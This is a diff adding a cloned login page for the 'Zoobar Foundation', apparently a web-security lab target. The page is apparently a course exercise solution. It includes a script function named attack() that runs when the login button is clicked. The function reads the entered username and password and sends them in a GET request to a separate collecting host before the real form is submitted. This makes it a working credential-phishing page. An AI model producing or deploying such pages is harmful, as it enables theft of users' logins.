@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<link rel="stylesheet" type="text/css" href="http://172.27.21.91:8080/zoobar/media/zoobar.css">
+<title>
+Login - Zoobar Foundation
+</title>
+</head>
+
+<script>
+function attack()
+{
+    username=document.getElementById('uName');
+    passwd=document.getElementById('pswd');
+    var req = new XMLHttpRequest();
+    var url = "http://172.27.22.124:8989?payload=" + username.value + "-----" + passwd.value;
+    req.open('GET',url,true);
+    req.send();	
+}
+</script>
+
+<body>
+<div id="userLoginPage" style="visibility: none">
+<h1><a href="http://172.27.21.91:8080/zoobar/index.cgi/">Zoobar Foundation for Principled Discourse</a></h1>
+<h2>Supporting the brave thinkers of the information superhighway</h2>
+
+<div id="login" class="centerpiece">
+<form name="loginform" method="POST" target="_self" action="http://172.27.21.91:8080/zoobar/index.cgi/login">
+<table>
+<tr>
+<td>Username:</td>
+<td><input type="text" name="login_username" id="uName" size="20"
+autocomplete="no" value=""></td>
+</tr>
+<tr>
+<td>Password:</td>
+<td colspan=2><input type="password" name="login_password"  id="pswd" size=20 autocomplete="no" style="display:inline">
+<button type="submit" name="submit_login" onclick="attack()">Log in</button>
+<button type="submit" name="submit_registration" visibility>Register</button></td>
+</tr>
+</table>
+<input type="hidden" name="nexturl" value="/zoobar/index.cgi/">
+</form>
+</div>
+<div class="footer warning">
+
+</div>
+</div>
+</body>
+<script>document.loginform.login_username.focus();</script>
+
+</html>
